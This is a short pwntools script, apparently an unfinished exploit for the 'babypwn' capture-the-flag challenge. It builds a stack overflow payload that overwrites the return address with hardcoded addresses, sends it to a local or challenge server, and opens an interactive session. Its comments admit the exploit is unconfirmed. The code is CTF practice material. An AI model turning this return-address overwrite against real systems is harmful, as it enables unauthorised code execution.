import pwn

pwn.context.arch = 'amd64'

# sh = pwn.remote('chal.cybersecurityrumble.de', 1990)
sh = pwn.remote('127.0.0.1', 1990)
# sh = pwn.process('./babypwn')


def inject_shellcode():
    # Target: 120 bytes
    # 8 bytes: (fake input)
    # 1 byte: (null to fool strlen)
    # 111 bytes: (no ops)
    # ---
    # 8 bytes: jump to shell code address
    # ---
    # 100 bytes: (no ops)
    # ? bytes: (shellcode)

    ret_addr_padding = 120
    buffer_addr = 0x7fffffffceb0
    # buffer_addr = 0x7fffffffcde0

    payload = b'\0' * (120 - (8 * 2));
    payload += pwn.p64(0x3)
    payload += pwn.p64(buffer_addr + 0x80 + 16)

    # ip set to = 0x7fffffffcf90

    # Confirmed that the ret address is being set correctly.
    # - Have not confirmed if the ret address is correct
    # - Have not confirmed if `flag` address is correct
    # - Since nothing is being printed, it probably landed in a bunch of zeroes
    payload += pwn.p64(0x0000555555555193)

    print('Payload len: ', len(payload))

    return payload


payload = inject_shellcode()

with open('payload', 'wb') as f:
    f.write(payload)

sh.send(payload)
# print(sh.recvline())
# print(sh.recvline())
sh.interactive()
